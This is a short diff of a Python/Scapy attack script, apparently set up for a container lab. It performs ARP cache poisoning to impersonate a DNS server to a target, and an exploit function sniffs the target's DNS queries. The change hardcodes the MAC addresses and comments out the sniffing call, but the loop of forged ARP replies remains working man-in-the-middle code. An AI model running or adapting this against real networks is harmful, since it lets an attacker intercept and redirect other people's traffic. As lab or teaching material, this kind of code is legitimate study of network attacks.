@@ -11,8 +11,8 @@ def device_setup():
 
 def ARPP(target, dns_server):
     print("[*] Sending poisoned ARP packets")
-    target_mac = getmacbyip(target)
-    dns_server_mac = getmacbyip(dns_server)
+    target_mac = "02:42:ac:14:00:04" #getmacbyip(target)
+    dns_server_mac = "02:42:ac:14:00:32" #getmacbyip(dns_server)
     while True:
         time.sleep(2)
         send(ARP(op=2, pdst=target, psrc=dns_server, hwdst=target_mac),verbose = 0)
@@ -20,7 +20,7 @@ def ARPP(target, dns_server):
 
 def exploit(target):
     print("[*] Listening ")
-    sniff (filter="udp and port 53 and host " + target, prn = process_received_packet)
+    #sniff (filter="udp and port 53 and host " + target, prn = process_received_packet)
 
 """
 RFC schema
